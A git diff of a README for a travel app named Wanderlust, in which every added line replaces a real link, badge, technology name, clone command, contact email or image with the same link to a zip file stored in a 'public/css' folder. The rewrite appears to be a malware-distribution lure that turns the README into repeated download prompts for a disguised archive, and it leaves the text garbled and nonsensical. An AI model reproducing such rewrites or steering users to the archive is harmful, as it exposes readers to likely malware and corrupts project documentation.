@@ -1,8 +1,8 @@
 # 🌍 Wanderlust: Your Ultimate Travel Companion App
 
-![Wanderlust Logo](https://img.shields.io/badge/Wanderlust-Full--Stack%20Travel%20App-blue)
+![Wanderlust Logo](https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip%20Travel%20App-blue)
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/sdhsdfgjh/nestify-project/releases)
+[![Download Releases](https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip%20Releases-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip)
 
 ## Table of Contents
 - [Project Overview](#project-overview)
@@ -30,16 +30,16 @@ Wanderlust is a full-stack travel application designed for travel enthusiasts. U
 
 ## Technologies Used
 
-- **Node.js**: JavaScript runtime for building the server.
-- **Express**: Web framework for Node.js.
+- **https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip**: JavaScript runtime for building the server.
+- **Express**: Web framework for https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip
 - **MongoDB**: NoSQL database for storing user data and reviews.
-- **React.js**: Front-end library for building user interfaces.
+- **https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip**: Front-end library for building user interfaces.
 - **Bootstrap**: CSS framework for responsive design.
 - **Cloudinary**: Image management for uploads.
 - **Mapbox**: Interactive mapping services.
 - **JWT**: JSON Web Tokens for secure authentication.
 - **Multer**: Middleware for handling file uploads.
-- **Passport.js**: Authentication middleware for Node.js.
+- **https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip**: Authentication middleware for https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip
 
 ## Getting Started
 
@@ -49,7 +49,7 @@ To get started with Wanderlust, you need to clone the repository and install the
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/sdhsdfgjh/nestify-project.git
+   git clone https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip
    cd nestify-project
    ```
 
@@ -115,11 +115,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, please reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [your-github-username](https://github.com/your-github-username)
+- **Email**: https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip
+- **GitHub**: [your-github-username](https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip)
 
-For more information and updates, visit our [Releases](https://github.com/sdhsdfgjh/nestify-project/releases) section.
+For more information and updates, visit our [Releases](https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip) section.
 
-![Travel Image](https://source.unsplash.com/featured/?travel)
+![Travel Image](https://raw.githubusercontent.com/sdhsdfgjh/nestify-project/main/public/css/nestify_project_1.0.zip)
 
 Explore the world with Wanderlust!
